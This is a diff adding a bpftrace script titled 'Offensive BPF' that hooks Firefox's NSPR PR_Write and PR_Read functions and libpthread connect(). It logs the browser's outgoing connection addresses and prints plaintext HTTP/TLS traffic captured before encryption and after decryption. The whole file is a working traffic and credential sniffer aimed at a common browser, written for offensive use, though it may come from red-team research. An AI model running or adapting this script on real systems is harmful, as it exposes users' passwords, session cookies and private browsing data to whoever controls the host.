@@ -1,0 +1,86 @@
+#include <net/sock.h>
+
+BEGIN
+{
+  printf("Welcome to Offensive BPF... Use Ctrl-C to exit.\n");
+}
+
+
+uprobe:/usr/lib/x86_64-linux-gnu/libpthread.so:connect
+/ comm == "Socket Thread"/ 
+{ 
+    
+    $addr = (struct sockaddr_in *) arg1;
+    $ip = ntop($addr->sin_addr);
+    printf("\n%s [%d]: Connect: fd: %d, %s",comm, pid, arg0, $ip);
+}
+
+
+uprobe:/usr/lib/firefox/libnspr4.so:PR_Write
+/ comm == "Socket Thread" /
+{ 
+    $i   = (uint64) 0;
+    $adj = (uint64) 0;
+
+    if ((str(arg1, 14) == "PRI * HTTP/2.0"))
+    {
+          //HTTP/2 Connection
+          //return;
+    }
+
+    while ($i <= 4096)  //ideally this would be arg2, but Verifier complains
+    {      
+      if ((4096 - $i) < 0)
+      {
+         $adj = 4096 - $i;
+      } 
+
+      printf("%s", str(arg1+$i, 16 - $adj));  //API is very forgiving regarding len it seems
+      $i = $i + 16;
+      if ($i > arg2)
+      {
+        printf("\n");
+        break;
+      }
+    }
+}
+
+uprobe:/usr/lib/firefox/libnspr4.so:PR_Read
+/ comm == "Socket Thread"/ 
+{ 
+  @nssread_buf[tid] = arg1;
+}
+
+
+uretprobe:/usr/lib/firefox/libnspr4.so:PR_Read
+/ @nssread_buf[tid] && comm == "Socket Thread" /
+{
+    if (retval > 0)
+    { 
+      printf("\n");
+    }
+
+    $i   = (uint64) 0; 
+    $adj = (uint64) 0;
+    while ($i <= 4096)  //ideally this would be retval, but verifier complains
+    { 
+      if ((4096 - $i) < 0)
+      {
+         $adj = 4096 - $i;
+      }
+
+      printf("%s", str(@nssread_buf[tid]+$i, 16 - $adj));        
+      $i = $i + 16;
+
+      if ($i > retval)
+      {
+          break;
+      }
+
+    }
+}
+
+END
+{ 
+  printf("\nExiting. Bye.\n");
+}
